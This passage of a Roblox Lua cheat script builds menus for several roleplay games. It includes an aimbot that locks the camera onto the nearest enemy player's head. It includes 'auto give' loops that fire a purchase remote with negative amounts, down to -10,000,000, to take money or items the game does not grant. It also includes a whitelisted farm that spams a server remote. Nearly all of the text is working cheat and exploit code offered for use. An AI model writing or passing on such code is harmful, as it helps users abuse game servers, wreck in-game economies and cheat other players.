    {id = 11719595129,  name = "Blade", fovMult = 0.8},
    {id = 1489774665,   name = "Nexus", fovMult = 1.5},
    {id = 6079707648,   name = "Core", fovMult = 0.7},
    {id = 11390723044,  name = "Phantom", fovMult = 1.6},
    {id = 10878218322,  name = "Ghost", fovMult = 1.1},
    {id = 11722081515,  name = "Razor", fovMult = 0.9},
    {id = 11390723057,  name = "Spike", fovMult = 1.0},
    {id = 251497633,    name = "Retro", fovMult = 1.2},
    {id = 11722153703,  name = "Fusion", fovMult = 1.7},
    {id = 8680062686,   name = "Nova", fovMult = 1.4},
    {id = 11350518862,  name = "Apex", fovMult = 1.3},
    {id = 11722554017,  name = "Zenith", fovMult = 1.8},
    {id = 8360620314,   name = "Echo", fovMult = 1.0},
    {id = 11988231127,  name = "Spectre", fovMult = 1.5},
    {id = 11830989304,  name = "Cipher", fovMult = 1.2},
    {id = 11759293285,  name = "Omega", fovMult = 1.6},
    {id = 11754499452,  name = "Sigma", fovMult = 0.8},
    {id = 2555584348,   name = "Delta", fovMult = 1.1},
    {id = 11717828297,  name = "Gamma", fovMult = 1.3},
    {id = 11724945237,  name = "Theta", fovMult = 1.4},
    {id = 11733801922,  name = "Kappa", fovMult = 1.0},
    {id = 11733622734,  name = "Lambda", fovMult = 1.2},
    {id = 11754273720,  name = "Mu", fovMult = 0.9},
    {id = 11754490994,  name = "Nu", fovMult = 1.1},
    {id = 11756696859,  name = "Xi", fovMult = 1.5},
    {id = 11802094220,  name = "Omicron", fovMult = 1.3},
    {id = 11867337948,  name = "Pi", fovMult = 1.0},
    {id = 11915656516,  name = "Rho", fovMult = 1.4},
    {id = 11986603133,  name = "Tau", fovMult = 1.7}
}

local CurrentCrosshair = Crosshairs[1]
local CurrentFOV = BaseFOV * CurrentCrosshair.fovMult

--// GUI SETUP
local screenGui = Instance.new("ScreenGui")
screenGui.Name = ""
screenGui.ResetOnSpawn = false
screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

--// CROSSHAIR
local crosshair = Instance.new("ImageLabel")
crosshair.Name = ""
crosshair.Image = "rbxassetid://" .. tostring(CurrentCrosshair.id)
crosshair.Size = UDim2.new(0, 32, 0, 32)
crosshair.AnchorPoint = Vector2.new(0.5, 0.5)
crosshair.Position = UDim2.new(0.5, 0, 0.46, 0)
crosshair.BackgroundTransparency = 1
crosshair.ZIndex = 10
crosshair.Active = false
crosshair.Parent = screenGui

--// HIDE CROSSHAIR (I)
UserInputService.InputBegan:Connect(function(input, gp)
	if gp then return end
	if input.KeyCode == Enum.KeyCode.I then
		crosshair.Visible = not crosshair.Visible
	end
end)

--// MAIN FRAME
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 340, 0, 560)
mainFrame.Position = UDim2.new(0, 20, 0.5, -280)
mainFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = mainFrame

--// TITLE
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 50)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "CROSSHAIR AIMBOT - GOMA"
title.TextColor3 = Color3.fromRGB(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 18
title.Parent = mainFrame

local titleCorner = Instance.new("UICorner")
titleCorner.CornerRadius = UDim.new(0, 12)
titleCorner.Parent = title

--// SCROLL FRAME
local scrollFrame = Instance.new("ScrollingFrame")
scrollFrame.Size = UDim2.new(1, -20, 1, -160)
scrollFrame.Position = UDim2.new(0, 10, 0, 55)
scrollFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
scrollFrame.ScrollBarThickness = 6
scrollFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 0, 0)
scrollFrame.BorderSizePixel = 0
scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
scrollFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
scrollFrame.Parent = mainFrame

local layout = Instance.new("UIGridLayout")
layout.CellSize = UDim2.new(0, 85, 0, 95)
layout.CellPadding = UDim2.new(0, 12, 0, 12)
layout.SortOrder = Enum.SortOrder.LayoutOrder
layout.Parent = scrollFrame

--// SETTINGS FRAME
local settingsFrame = Instance.new("Frame")
settingsFrame.Size = UDim2.new(1, -20, 0, 110)
settingsFrame.Position = UDim2.new(0, 10, 1, -120)
settingsFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
settingsFrame.BorderSizePixel = 0
settingsFrame.Parent = mainFrame

local settingsCorner = Instance.new("UICorner")
settingsCorner.CornerRadius = UDim.new(0, 10)
settingsCorner.Parent = settingsFrame

-- Mode Label
local modeLabel = Instance.new("TextLabel")
modeLabel.Text = "Aimbot Mode:"
modeLabel.TextColor3 = Color3.fromRGB(0,0,0)
modeLabel.Size = UDim2.new(0, 120, 0, 25)
modeLabel.Position = UDim2.new(0, 10, 0, 10)
modeLabel.BackgroundTransparency = 1
modeLabel.Font = Enum.Font.Roboto
modeLabel.TextSize = 14
modeLabel.Parent = settingsFrame

-- Mode Dropdown Button
local modeDropdown = Instance.new("TextButton")
modeDropdown.Text = "Mode: Instant"
modeDropdown.Size = UDim2.new(0, 160, 0, 25)
modeDropdown.Position = UDim2.new(0, 140, 0, 10)
modeDropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
modeDropdown.TextColor3 = Color3.fromRGB(0,0,0)
modeDropdown.Font = Enum.Font.Roboto
modeDropdown.TextSize = 14
modeDropdown.Parent = settingsFrame

local dropdownCorner = Instance.new("UICorner")
dropdownCorner.CornerRadius = UDim.new(0, 8)
dropdownCorner.Parent = modeDropdown

-- Toggle Mode Function
modeDropdown.MouseButton1Click:Connect(function()
	if AimbotMode == "Instant" then
		AimbotMode = "Smooth"
		modeDropdown.Text = "Mode: Smooth"
	else
		AimbotMode = "Instant"
		modeDropdown.Text = "Mode: Instant"
	end
end)

-- Smoothness Input
local smoothLabel = Instance.new("TextLabel")
smoothLabel.Text = "Smoothness:"
smoothLabel.TextColor3 = Color3.fromRGB(0,0,0)
smoothLabel.Size = UDim2.new(0, 120, 0, 25)
smoothLabel.Position = UDim2.new(0, 10, 0, 45)
smoothLabel.BackgroundTransparency = 1
smoothLabel.Font = Enum.Font.Roboto
smoothLabel.TextSize = 14
smoothLabel.Parent = settingsFrame

local smoothBox = Instance.new("TextBox")
smoothBox.Size = UDim2.new(0, 160, 0, 25)
smoothBox.Position = UDim2.new(0, 140, 0, 45)
smoothBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
smoothBox.TextColor3 = Color3.fromRGB(0,0,0)
smoothBox.PlaceholderText = tostring(Smoothness)
smoothBox.Font = Enum.Font.Roboto
smoothBox.TextSize = 14
smoothBox.Parent = settingsFrame

local smoothCorner = Instance.new("UICorner")
smoothCorner.CornerRadius = UDim.new(0, 8)
smoothCorner.Parent = smoothBox

-- Update Smoothness on Input
smoothBox.FocusLost:Connect(function(enterPressed)
	local val = tonumber(smoothBox.Text)
	if val and val > 0 then
		Smoothness = math.clamp(val, 0.01, 1)
	end
end)

-- STATUS LABEL
local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, -20, 0, 35)
statusLabel.Position = UDim2.new(0, 10, 1, -45)
statusLabel.BackgroundColor3 = Color3.fromRGB(255,255,255)
statusLabel.TextColor3 = Color3.fromRGB(0,0,0)
statusLabel.Text = "Aimbot: OFF | FOV: " .. CurrentFOV
statusLabel.Font = Enum.Font.Roboto
statusLabel.TextSize = 16
statusLabel.Parent = mainFrame

local statusCorner = Instance.new("UICorner")
statusCorner.CornerRadius = UDim.new(0, 8)
statusCorner.Parent = statusLabel

-- CROSSHAIR BUTTONS
local function createCrosshairButton(data)
    local frame = Instance.new("Frame")
    frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
    frame.BorderSizePixel = 1
    frame.BorderColor3 = Color3.fromRGB(255, 255, 255)

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = frame

    local img = Instance.new("ImageLabel")
    img.Size = UDim2.new(1, -8, 0.75, -8)
    img.Position = UDim2.new(0, 4, 0, 4)
    img.BackgroundTransparency = 1
    img.Image = "rbxassetid://" .. tostring(data.id)
    img.ImageColor3 = Color3.fromRGB(255, 255, 255)
    img.Parent = frame

    local nameLabel = Instance.new("TextLabel")
    nameLabel.Size = UDim2.new(1, 0, 0.25, 0)
    nameLabel.Position = UDim2.new(0, 0, 0.75, 0)
    nameLabel.BackgroundTransparency = 1
    nameLabel.Text = data.name
    nameLabel.TextColor3 = Color3.fromRGB(0,0,0)
    nameLabel.Font = Enum.Font.Roboto
    nameLabel.TextSize = 13
    nameLabel.Parent = frame

    local button = Instance.new("TextButton")
    button.Size = UDim2.new(1, 0, 1, 0)
    button.BackgroundTransparency = 1
    button.Text = ""
    button.Parent = frame

    button.MouseButton1Click:Connect(function()
        CurrentCrosshair = data
        CurrentFOV = BaseFOV * data.fovMult
        crosshair.Image = "rbxassetid://" .. tostring(data.id)
        statusLabel.Text = "Aimbot: " .. (AimEnabled and "ON" or "OFF") .. " | FOV: " .. math.floor(CurrentFOV * 10) / 10
    end)

    frame.Parent = scrollFrame
end

for _, data in ipairs(Crosshairs) do
	createCrosshairButton(data)
end

layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
	scrollFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 20)
end)

--// AIMBOT LOGIC
local function getTargetPart(character)
	return character:FindFirstChild("Head") or character:FindFirstChild("HumanoidRootPart")
end

local function getClosestPlayer()
	local closest, shortest = nil, math.huge
	if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then return nil end
	for _, p in ipairs(Players:GetPlayers()) do
		if p ~= LocalPlayer and p.Character then
			local part = getTargetPart(p.Character)
			local hum = p.Character:FindFirstChildOfClass("Humanoid")
			if part and hum and hum.Health > 0 then
				local pos, visible = Camera:WorldToScreenPoint(part.Position)
				if visible then
					local dist = (Vector2.new(pos.X, pos.Y) - Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)).Magnitude
					if dist < CurrentFOV * 20 and dist < shortest then
						closest, shortest = part.Position, dist
					end
				end
			end
		end
	end
	return closest
end

local function aimAtTarget()
	local t = getClosestPlayer()
	if t then
		if AimbotMode == "Instant" then
			Camera.CFrame = CFrame.new(Camera.CFrame.Position, t)
		else
			Camera.CFrame = Camera.CFrame:Lerp(CFrame.new(Camera.CFrame.Position, t), Smoothness)
		end
	end
end

-- RIGHT-CLICK TOGGLE AIMBOT
UserInputService.InputBegan:Connect(function(input, gp)
	if gp then return end
	if input.UserInputType == Enum.UserInputType.MouseButton2 then
		AimEnabled = true
		statusLabel.Text = "Aimbot: ON | FOV: " .. math.floor(CurrentFOV * 10) / 10
	end
end)

UserInputService.InputEnded:Connect(function(input, gp)
	if gp then return end
	if input.UserInputType == Enum.UserInputType.MouseButton2 then
		AimEnabled = false
		statusLabel.Text = "Aimbot: OFF | FOV: " .. math.floor(CurrentFOV * 10) / 10
	end
end)

RunService.RenderStepped:Connect(function()
	if AimEnabled then
		aimAtTarget()
	end
end)

-- TOGGLE MENU (INSERT)
UserInputService.InputBegan:Connect(function(input, gp)
	if gp then return end
	if input.KeyCode == Enum.KeyCode.Insert then
		mainFrame.Visible = not mainFrame.Visible
	end
end)

print("ILOVEYOU MONSY !")
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("BAGONG BARYO CITY (MONSY)", function()
	--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 400)
frame.Position = UDim2.new(0.5, -150, 0.5, -200)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "Bagong Baryo City"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- Dropdown (Select Gun)
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Gun"
dropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown.TextColor3 = Color3.new(0,0,0)
dropdown.Font = Enum.Font.Roboto
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

local gunList = {"Silenced Pistol", "Crowbar", "Drill", "Oxy", "Pen Gun", "AK-47", "AmmoBox"}

local selectedGun = nil

-- Dropdown Menu
local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, #gunList * 25)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

for i, gun in ipairs(gunList) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 25)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * 25)
    btn.Text = gun
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedGun = gun
        dropdown.Text = gun
        dropdownFrame.Visible = false
    end)
end

dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Preset Buttons (Aligned)
local buttonSpacing = 5
local buttonWidth = (300 - 40 - (buttonSpacing * 2)) / 3
local buttonYOffset = 95 + #gunList * 25

local amountBox = Instance.new("TextBox") -- forward declare here so buttons can use it

for i, data in ipairs({
    {Label = "Give 100K", Value = -100000},
    {Label = "Give 1M", Value = -1000000},
    {Label = "Give 10M", Value = -10000000},
}) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, buttonWidth, 0, 30)
    btn.Position = UDim2.new(0, 10 + (buttonWidth + buttonSpacing) * (i - 1), 0, buttonYOffset)
    btn.Text = data.Label
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 12
    btn.Parent = frame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        amountBox.Text = tostring(data.Value)
    end)
end

-- Amount Box
amountBox.Size = UDim2.new(1, -20, 0, 30)
amountBox.Position = UDim2.new(0, 10, 0, buttonYOffset + 40)
amountBox.PlaceholderText = "Enter Amount (PUBLIC ENEMY CMD)"
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.new(0,0,0)
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.Font = Enum.Font.Roboto
amountBox.TextSize = 12
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

-- Auto Give Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, buttonYOffset + 80)
toggle.Text = "Start Auto Give"
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.TextColor3 = Color3.new(0,0,0)
toggle.Font = Enum.Font.Roboto
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- Auto Give Logic
local giving = false

toggle.MouseButton1Click:Connect(function()
    giving = not giving
    toggle.Text = giving and "Stop Auto Give" or "Start Auto Give"
    while giving do
        if selectedGun and tonumber(amountBox.Text) then
            ReplicatedStorage.BuyItemRemote:FireServer(selectedGun, tonumber(amountBox.Text))
        end
        task.wait(10)
    end
end)

-- RightShift to toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("BAGONG BARYO SPAWN GUN (SANTINO)", function()
	--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 400)
frame.Position = UDim2.new(0.5, -150, 0.5, -200)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "PERSONAL SANTINO SCRIPT"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- Dropdown (Select Gun)
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Gun"
dropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown.TextColor3 = Color3.new(0,0,0)
dropdown.Font = Enum.Font.Roboto
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

local gunList = {"Silenced Pistol", "Crowbar", "Drill", "Oxy", "Pen Gun", "Unknown", "Unknown"}

local selectedGun = nil

-- Dropdown Menu
local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, #gunList * 25)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

for i, gun in ipairs(gunList) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 25)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * 25)
    btn.Text = gun
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedGun = gun
        dropdown.Text = gun
        dropdownFrame.Visible = false
    end)
end

dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Preset Buttons (Aligned)
local buttonSpacing = 5
local buttonWidth = (300 - 40 - (buttonSpacing * 2)) / 3
local buttonYOffset = 95 + #gunList * 25

local amountBox = Instance.new("TextBox") -- forward declare here so buttons can use it

for i, data in ipairs({
    {Label = "Give 100K", Value = -100000},
    {Label = "Give 1M", Value = -1000000},
    {Label = "Give 10M", Value = -10000000},
}) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, buttonWidth, 0, 30)
    btn.Position = UDim2.new(0, 10 + (buttonWidth + buttonSpacing) * (i - 1), 0, buttonYOffset)
    btn.Text = data.Label
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 12
    btn.Parent = frame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        amountBox.Text = tostring(data.Value)
    end)
end

-- Amount Box
amountBox.Size = UDim2.new(1, -20, 0, 30)
amountBox.Position = UDim2.new(0, 10, 0, buttonYOffset + 40)
amountBox.PlaceholderText = "Enter Amount (PUBLIC ENEMY CMD)"
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.new(0,0,0)
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.Font = Enum.Font.Roboto
amountBox.TextSize = 12
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

-- Auto Give Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, buttonYOffset + 80)
toggle.Text = "Start Auto Give"
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.TextColor3 = Color3.new(0,0,0)
toggle.Font = Enum.Font.Roboto
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- Auto Give Logic
local giving = false

toggle.MouseButton1Click:Connect(function()
    giving = not giving
    toggle.Text = giving and "Stop Auto Give" or "Start Auto Give"
    while giving do
        if selectedGun and tonumber(amountBox.Text) then
            ReplicatedStorage.BuyItemRemote:FireServer(selectedGun, tonumber(amountBox.Text))
        end
        task.wait(0.001)
    end
end)

-- RightShift to toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

local function addMainMenuButton(text, callback)
	local panel = allTabPanels["SKYLINE CITY"]
	if not panel then return end

	local btn = new("TextButton", {
		Size = UDim2.new(1, -16, 0, 38),
		BackgroundColor3 = Color3.fromRGB(245,245,245),
		TextColor3 = Color3.new(0,0,0),
		Font = Enum.Font.Roboto,
		TextSize = 14,
		Text = text,
		AutoButtonColor = false,
		Parent = panel,
	})
	new("UICorner", {CornerRadius = UDim.new(0,6), Parent = btn})

	btn.MouseEnter:Connect(function()
		local t = getThemeColors()
		local hover = t.bg:Lerp(t.accent, 0.50)
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = hover}):Play()
	end)
	btn.MouseLeave:Connect(function()
		local t = getThemeColors()
		local base = t.bg:Lerp(t.accent, 0.32)
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = base}):Play()
	end)

	btn.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

addMainMenuButton("SKYLINE CITY INSTANT MONEY (WHITELISTED)", function()
	local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local UserInputService = game:GetService("UserInputService")
local RS = game:GetService("ReplicatedStorage")

local WHITELIST = {
    "nodylaws",
    "notti_osama123az",
    "WestSideX0",
	"theyluvzmonsy",
}

local isWhitelisted = false
for _, name in ipairs(WHITELIST) do
    if name:lower() == LocalPlayer.Name:lower() then
        isWhitelisted = true
        break
    end
end

local farming = false
local farmThread = nil

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "MonsyFarmGUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = PlayerGui

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 220, 0, 120)
MainFrame.Position = UDim2.new(0.5, -110, 0.5, -60)
MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 8)
UICorner.Parent = MainFrame

local UIStroke = Instance.new("UIStroke")
UIStroke.Color = Color3.fromRGB(210, 210, 210)
UIStroke.Thickness = 1
UIStroke.Parent = MainFrame

local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 40)
TitleBar.Position = UDim2.new(0, 0, 0, 0)
TitleBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TitleBar.BorderSizePixel = 0
TitleBar.ZIndex = 2
TitleBar.Parent = MainFrame

local TitleBarCorner = Instance.new("UICorner")
TitleBarCorner.CornerRadius = UDim.new(0, 8)
TitleBarCorner.Parent = TitleBar

local TitleBarFix = Instance.new("Frame")
TitleBarFix.Size = UDim2.new(1, 0, 0, 10)
TitleBarFix.Position = UDim2.new(0, 0, 1, -10)
TitleBarFix.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TitleBarFix.BorderSizePixel = 0
TitleBarFix.ZIndex = 2
TitleBarFix.Parent = TitleBar

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(1, 0, 1, 0)
TitleLabel.Position = UDim2.new(0, 0, 0, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "// @ Monsy"
TitleLabel.TextColor3 = Color3.fromRGB(20, 20, 20)
TitleLabel.TextSize = 17
TitleLabel.Font = Enum.Font.RobotoMono
TitleLabel.TextXAlignment = Enum.TextXAlignment.Center
TitleLabel.ZIndex = 3
TitleLabel.Parent = TitleBar

local StatusLabel = Instance.new("TextLabel")
StatusLabel.Size = UDim2.new(1, -20, 0, 16)
StatusLabel.Position = UDim2.new(0, 10, 0, 46)
StatusLabel.BackgroundTransparency = 1
StatusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
StatusLabel.TextSize = 10
StatusLabel.Font = Enum.Font.RobotoMono
StatusLabel.TextXAlignment = Enum.TextXAlignment.Center
StatusLabel.ZIndex = 2
StatusLabel.Parent = MainFrame

-- // Kung NOT whitelisted: Status = Locked
if not isWhitelisted then
    StatusLabel.Text = "Status: 🔒 Not Whitelisted"
    StatusLabel.TextColor3 = Color3.fromRGB(200, 0, 0)
else
    StatusLabel.Text = "Status: Idle"
    StatusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
end

local FarmBtn = Instance.new("TextButton")
FarmBtn.Size = UDim2.new(0, 180, 0, 34)
FarmBtn.Position = UDim2.new(0.5, -90, 0, 74)
FarmBtn.BorderSizePixel = 0
FarmBtn.ZIndex = 2
FarmBtn.Font = Enum.Font.RobotoMono
FarmBtn.TextSize = 12
FarmBtn.Parent = MainFrame

-- // Button appearance depending on whitelist
if isWhitelisted then
    FarmBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    FarmBtn.Text = "FARM | OFF"
    FarmBtn.TextColor3 = Color3.fromRGB(20, 20, 20)
else
    FarmBtn.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
    FarmBtn.Text = "🔒 LOCKED"
    FarmBtn.TextColor3 = Color3.fromRGB(180, 180, 180)
end

local FarmBtnCorner = Instance.new("UICorner")
FarmBtnCorner.CornerRadius = UDim.new(0, 6)
FarmBtnCorner.Parent = FarmBtn

local FarmBtnStroke = Instance.new("UIStroke")
FarmBtnStroke.Color = Color3.fromRGB(20, 20, 20)
FarmBtnStroke.Thickness = 0
FarmBtnStroke.Parent = FarmBtn

local function setStatus(text, color)
    StatusLabel.Text = "Status: " .. text
    StatusLabel.TextColor3 = color or Color3.fromRGB(0, 0, 0)
end

local function runFarm()
    while farming do
        setStatus("Giving Skyline Box...", Color3.fromRGB(0, 0, 0))
        local remote = RS:WaitForChild("GiveAyuda", 9e9)
        local args1 = { [1] = "Skyline Box" }
        for i = 1, 12 do
            if not farming then break end
            remote:FireServer(unpack(args1))
            if i < 12 then
                task.wait(0.001)
            end
        end

        if not farming then break end

        setStatus("Applying Morph...", Color3.fromRGB(0, 0, 0))
        pcall(function()
            local args2 = { [1] = "Male", [2] = "x", [3] = "x" }
            RS:WaitForChild("SkylineRP", 9e9):WaitForChild("Morph", 9e9):FireServer(unpack(args2))
        end)

        task.wait(0.1)
    end

    setStatus("Idle", Color3.fromRGB(0, 0, 0))
end

FarmBtn.MouseButton1Click:Connect(function()
    -- // Block kung hindi whitelisted
    if not isWhitelisted then return end

    farming = not farming

    if farming then
        FarmBtn.Text = "FARM | ON"
        FarmBtnStroke.Color = Color3.fromRGB(0, 0, 0)
        FarmBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
        farmThread = task.spawn(runFarm)
    else
        farming = false
        if farmThread then
            task.cancel(farmThread)
            farmThread = nil
        end
        FarmBtn.Text = "FARM | OFF"
        FarmBtnStroke.Color = Color3.fromRGB(0, 0, 0)
        FarmBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
        setStatus("Idle", Color3.fromRGB(0, 0, 0))
    end
end)

-- // Drag logic
local dragging = false
local dragInput, mousePos, framePos

TitleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        mousePos = input.Position
        framePos = MainFrame.Position
